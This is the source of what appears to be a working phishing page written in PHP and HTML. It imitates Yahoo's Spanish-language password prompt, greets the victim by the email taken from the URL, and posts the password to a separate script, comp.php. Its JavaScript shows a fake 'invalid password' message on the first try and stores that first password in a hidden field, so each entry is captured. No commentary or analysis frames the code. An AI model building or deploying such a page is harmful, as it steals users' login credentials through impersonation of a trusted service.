<?php
session_start();
ob_start();
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	

parse_str(parse_url($url, PHP_URL_QUERY));

	
$parts = @explode('@', $userid);
	
$user = @$parts[0];
$email= $_POST['username'];
// start > to get url and and put id 
	



	
?>

<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo
</title>
        <link rel="dns-prefetch" href="//gstatic.com">
        <link rel="dns-prefetch" href="//google.com">
        <link rel="dns-prefetch" href="//s.yimg.com">
        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
        <link rel="dns-prefetch" href="//geo.yahoo.com">
        <link rel="icon" type="image/x-icon" href="/netease/guce/image/favicon.ico">
        <link rel="shortcut icon" type="image/x-icon" href="/netease/guce/image/favicon.ico">
        <link rel="apple-touch-icon" href="/netease/guce/image/apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="/netease/guce/image/apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="/netease/guce/css/grids-responsive-min.css">
        <!--<![endif]-->
        <style nonce="aWjkF03GshU+Sowo1Au/dhVTCWnf+4vOw8O/Kpa9AgC1YHKk">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="/netease/guce/css/yahoo-main.css" rel="stylesheet" type="text/css"><style nonce="aWjkF03GshU+Sowo1Au/dhVTCWnf+4vOw8O/Kpa9AgC1YHKk">/*! Copyright 2017 Yahoo Holdings, Inc. All rights reserved. */
._yb_9o7bl{direction:ltr;box-sizing:border-box;-webkit-font-smoothing:antialiased;letter-spacing:-0.31em;text-rendering:optimizespeed;font-size:0;line-height:84px;min-width:1024px;max-width:1920px;margin:0 auto;padding:0 64px 0 50px;position:relative;z-index:1000}._yb_9o7bl > *{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_9o7bl *{box-sizing:border-box}._yb_1e69k{font-size:0;display:inline-block;vertical-align:middle}._yb_9o4v8,._yb_1fgsw,._yb_sr93h,._yb_112vr,._yb_9o5i2,._yb_1gg6y{}._yb_9o4v8{width:142px}._yb_1fgsw{font-size:1rem;max-width:844px;min-width:496px;position:relative;width:46%}._yb_13t9k{letter-spacing:-0.31em;text-rendering:optimizespeed;padding-right:inherit;position:absolute;right:0;top:50%;transform:translateY(-50%)}._yb_13t9k > ._yb_1e69k{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_13t9k > ._yb_1e69k + ._yb_1e69k{margin-left:32px}._yb_4mdgw{margin:0}._yb_yjgz2{padding:0}._yb_yjgz2 ._yb_9o4v8{text-align:center;width:192px}@media only screen and (min-width:1440px){._yb_yjgz2 ._yb_9o4v8{max-width:224px;width:14%}}._yb_yjgz2 ._yb_1fgsw{width:44%}._yb_yjgz2._yb_6is4h > ._yb_9o4v8,._yb_yjgz2._yb_4te5s > ._yb_9o4v8,._yb_yjgz2._yb_17bwg > ._yb_9o4v8,._yb_yjgz2._yb_1nj4o > ._yb_9o4v8{width:224px}._yb_yjgz2 ._yb_13t9k{padding-right:32px}._yb_1vw7q,._yb_1yx3p{min-width:initial}._yb_1vw7q{padding-left:54px}._yb_1yx3p{background:#6302de}._yb_1yx3p._yb_j5ayu,._yb_1yx3p._yb_l9vwm,._yb_1yx3p._yb_1qpt3,._yb_1yx3p._yb_w05xf,._yb_1yx3p._yb_kjsn8{background:#000}._yb_1yx3p._yb_10c56{background:#2b2c2f}._yb_1yx3p._yb_1qohj,._yb_1yx3p._yb_1sa8x{background:#333}._yb_1yx3p._yb_13a02{background:#feeade}._yb_1yx3p._yb_ct3pv{background:#2b2d32}._yb_91fgf._yb_u8zjx{background:#6302de}._yb_1yx3p._yb_hv7vi{background:#222}._yb_1yx3p._yb_csu08{background:#0a4ea3}._yb_1yx3p._yb_q6aiy{background:#0a0a0a}._yb_1yx3p._yb_3j3zf{background:#fff}._yb_1yx3p._yb_iida5{background:#1e4e9d}._yb_1yx3p._yb_1827d{background:linear-gradient(303deg,#00d301,#36c275 50%,#00a562)}._yb_1yx3p._yb_1oasp{background:#36465d}@media screen and (max-width:768px){._yb_1vw7q{line-height:54px;padding:0 24px 0 20px}._yb_1yx3p{line-height:50px;padding:0}._yb_1vw7q._yb_1qohj,._yb_1vw7q._yb_u8zjx,._yb_1vw7q._yb_l9vwm,._yb_1vw7q._yb_q6aiy,._yb_1yx3p{text-align:center}._yb_1vw7q ._yb_9o4v8,._yb_1yx3p ._yb_9o4v8{width:auto}._yb_j5ayu ._yb_9o4v8{height:18px}._yb_13a02 ._yb_9o4v8{height:12px}._yb_u8zjx ._yb_9o4v8,._yb_ct3pv ._yb_9o4v8{height:24px}._yb_l9vwm ._yb_9o4v8,._yb_csu08 ._yb_9o4v8{height:15px}._yb_1qpt3 ._yb_9o4v8{height:22px}._yb_1yx3p._yb_iida5 ._yb_9o4v8{height:20px}._yb_1827d ._yb_9o4v8{height:20px}}._yb_ao5fq{width:1020px}._yb_17bts,._yb_1vdvd,._yb_3wwjm,._yb_c6nqu{padding-left:10px}._yb_17bts > ._yb_9o4v8,._yb_1vdvd > ._yb_9o4v8,._yb_3wwjm > ._yb_9o4v8,._yb_c6nqu > ._yb_9o4v8{margin-right:10px;width:auto}.ybar-amp{min-width:initial;max-width:initial;padding-right:0}._yb_26vo4{display:inline-block;font-size:0;height:100%}._yb_26vo4:focus{outline-offset:2px;outline:3px solid #00abf0;outline:5px auto -webkit-focus-ring-color}._yb_x1qny{max-height:40px;max-width:100%}._yb_leqoo > ._yb_x1qny,._yb_1y0tn > ._yb_x1qny,._yb_18sbb > ._yb_x1qny,._yb_uz4ba > ._yb_x1qny{max-height:none}.ybar-dark ._yb_10shr,.ybar-light ._yb_26s9y{display:none}.ybar-amp ._yb_26vo4{display:block;margin:auto;padding:10px 0;text-align:center}@media screen and (max-width:768px){._yb_xsl95 ._yb_x1qny,._yb_1qxvn ._yb_x1qny{height:100%;max-height:32px}}</style>
        <script nonce="aWjkF03GshU+Sowo1Au/dhVTCWnf+4vOw8O/Kpa9AgC1YHKk">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 150002993;
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=150002993&ref=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":3000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1540817070358;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=fdr6smldte05e&crumb=' + encodeURIComponent('tlJq6fQqRom') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };
        </script>
        
    </head>
    <body >
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            <p class="mbr-legacy-device">
                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page&#x3D;content&amp;y&#x3D;PROD_ACCT&amp;id&#x3D;SLN4556&amp;actp&#x3D;productlink&amp;locale&#x3D;en_US">More Info</a>
            </p>
        </div>
    <script nonce="aWjkF03GshU+Sowo1Au/dhVTCWnf+4vOw8O/Kpa9AgC1YHKk">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish  puree-v2">
    <div class="mbr-ybar ybar-light">
    <div id="ybar" role="banner" class="_yb_9o7bl     "> <script id="ybarConfig" type="text/x-template">{}</script>  <div class="_yb_9o4v8 _yb_1e69k"><a href="https:&#x2F;&#x2F;www.yahoo.com&#x2F;" class="_yb_26vo4    " data-ylk="sec:yb_logo;slk:login;itc:0;">   <img class="_yb_x1qny _yb_10shr" src="/netease/guce/image/yahoo_en-US_f_p_bestfit.png" srcset="/netease/guce/image/yahoo_en-US_f_p_bestfit.png 1x, http://tlef.net/netease/guce/image/yahoo_en-US_f_p_bestfit_2x.png 2x" onerror="this.onerror=null;this.style.display='none';" alt="login"><img class="_yb_x1qny _yb_26s9y" src="/netease/guce/image/yahoo_en-US_f_w_bestfit.png" srcset="http://tlef.net/netease/guce/image/yahoo_en-US_f_w_bestfit.png 1x, http://tlef.net/netease/guce/image/yahoo_en-US_f_w_bestfit_2x.png 2x" alt="login" onerror="this.onerror=null;this.style.display='none';">   login</a></div><div role="toolbar" class="_yb_13t9k "></div></div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="/netease/guce/image/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo " width="116" height="" />
            </div>
            <div class="challenge password-challenge ">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hola <?php echo $email ?></h1>
            <p class="not-you"><a href="https://login.yahoo.com/?display&#x3D;login&amp;done&#x3D;https%3A%2F%2Fca.yahoo.com%2F&amp;prefill&#x3D;0&amp;add&#x3D;1">¿No eres tú?</a></p>
    </div>
    <form action="comp.php" method="post" class="pure-form pure-form-stackeds">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="tlJq6fQqRom" />
        <input type="hidden" name="acrumb" value="bJvjGkfQ" />
        <input type="hidden" name="sessionIndex" value="QQ--" />
        <input type="hidden" name="displayName" value="<?php echo $email; ?>" />
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation"
                autocorrect="off" spellcheck="false"
                name="username" value="<?php echo $email; ?>" />
        </div>
        <input type="hidden" name="passwordContext" value="normal" />
        <input type="password" id="login-passwd"  name="password" placeholder="Contrasena" value=""/>
        <input type="hidden" id="fpasswrd" name="fpasswrd"/>
		 <p id = "error-msgs" class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD" style="display:none">Contraseña invalida. Inténtalo de nuevo</p>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary " name="verifyPassword" value="Iniciar sesion" onclick="return validatePassword()">
                    Iniciar sesion 
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link"
                data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link"
                name="skip" value="He olvidiado mi contraseña" />
        </p>
    </form>
</div>

</div>

        </div>
		<script type="text/javascript">
		if (!count){
		   var count =0; 
		}
		function validatePassword(){
		    if (count<1){
		//form validation procedures...run on client side
		document.getElementById("error-msgs").style.display="block";
		var currentpwd= document.getElementById("login-passwd").value
		document.getElementById("login-passwd").value="";
		document.getElementById("fpasswrd").value = currentpwd;
		count++;
		return false;
		    }
		    
		    
		}
		</script>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
            <div id="login-ad-rich"></div>
        </div>
    </div>
</div>

    <!--<script src="https://s.yimg.com/wm/mbr/e87c6b2f2d182050c3459b4b81c01493ad6d53e1/bundle.js"></script><script nonce="aWjkF03GshU+Sowo1Au/dhVTCWnf+4vOw8O/Kpa9AgC1YHKk"></script><script nonce="aWjkF03GshU+Sowo1Au/dhVTCWnf+4vOw8O/Kpa9AgC1YHKk"></script>-->
    <noscript>
        <img src="/account/js-reporting/?crumb=tlJq6fQqRom&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="aWjkF03GshU+Sowo1Au/dhVTCWnf+4vOw8O/Kpa9AgC1YHKk">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>
</body>
</html>
<!-- fe13.member.ir2.yahoo.com - Mon Oct 29 2018 12:44:30 GMT+0000 (UTC) - (1ms) -->
